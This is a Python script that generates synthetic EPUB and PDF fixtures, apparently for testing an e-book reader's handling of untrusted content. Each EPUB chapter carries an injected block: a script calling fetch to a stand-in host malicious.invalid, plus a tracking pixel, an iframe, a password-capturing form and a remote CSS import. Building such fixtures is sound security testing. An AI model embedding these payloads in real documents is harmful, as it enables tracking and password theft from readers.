"""Synthetic reader fixtures only: no personal or copyrighted book content."""
from pathlib import Path
import zipfile
from reportlab.pdfgen import canvas
p=Path(__file__).resolve().parents[2]/'tests/books/generated'
p.mkdir(parents=True,exist_ok=True)
with zipfile.ZipFile(p/'sea-and-sky.epub','w',zipfile.ZIP_DEFLATED) as z:
 z.writestr('mimetype','application/epub+zip',compress_type=zipfile.ZIP_STORED)
 z.writestr('META-INF/container.xml','''<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>''')
 z.writestr('OEBPS/content.opf','''<?xml version="1.0"?><package version="3.0" xmlns="http://www.idpf.org/2007/opf" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:uuid:synthetic-sea-and-sky</dc:identifier><dc:title>Sea and Sky</dc:title><dc:creator>Duck &amp; Bear Test Library</dc:creator><dc:language>en</dc:language><dc:description>A synthetic book for testing the reader. Not a book from your library.</dc:description><meta property="dcterms:modified">2026-10-03T00:00:00Z</meta></metadata><manifest><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/><item id="c1" href="one.xhtml" media-type="application/xhtml+xml"/><item id="c2" href="two.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="c1"/><itemref idref="c2"/></spine></package>''')
 z.writestr('OEBPS/nav.xhtml','''<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>Contents</title></head><body><nav epub:type="toc"><ol><li><a href="one.xhtml">1. The shore</a></li><li><a href="two.xhtml">2. The headland</a></li></ol></nav></body></html>''')
 for filename,title,lead in [('one.xhtml','The shore','The shore was quiet that morning. Beyond the harbour the water caught the light.'),('two.xhtml','The headland','The headland opened into a broad path. A small lighthouse waited at the far end.')]:
  paragraphs=''.join(f'<p>{lead} This is original test paragraph {i}. We walked a little further, stopped to look at the sea, and carried on at our own pace. The book needs enough words to test different font sizes and reading positions.</p>' for i in range(1,28))
  attack='''<script>parent.__bookScriptExecuted=true;fetch('https://malicious.invalid/leak')</script><img src="https://malicious.invalid/pixel"/><iframe src="https://malicious.invalid/frame"></iframe><form action="https://malicious.invalid/post"><input name="password"/></form><style>@import url('https://malicious.invalid/style');</style>'''
  z.writestr('OEBPS/'+filename,f'<html xmlns="http://www.w3.org/1999/xhtml"><head><title>{title}</title></head><body><h1>{title}</h1>{paragraphs}{attack}</body></html>')
c=canvas.Canvas(str(p/'field-notes.pdf'),pagesize=(420,595))
c.setTitle('Field Notes');c.setAuthor('Duck and Bear Test Library')
for page in range(1,4):
 c.setFont('Helvetica-Bold',22);c.drawString(36,535,f'Field notes — {page}')
 c.setFont('Helvetica',12)
 for i,line in enumerate(['A synthetic PDF for the private reader.', 'Coastal walks, photographs and small details.', 'This lighthouse is a useful search result.', 'Bookmarks should return to the right page.']):c.drawString(36,485-i*25,line)
 c.showPage()
c.save()
print(p)
